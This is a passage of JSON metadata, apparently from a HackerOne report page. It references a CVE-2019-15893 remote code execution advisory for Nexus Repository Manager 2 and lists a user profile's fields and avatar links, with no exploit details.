360035055794-CVE-2019-15893-Nexus-Repository-Manager-2-Remote-Code-Execution-2019-09-03","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":429706,"username":"acazzolla","name":"Adam Cazzolla","bio":null,"cleared":false,"website":null,"location":null,"created_at":"2018-12-07T21:38:26.465Z","url":"https://hackerone.com/acazzolla","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}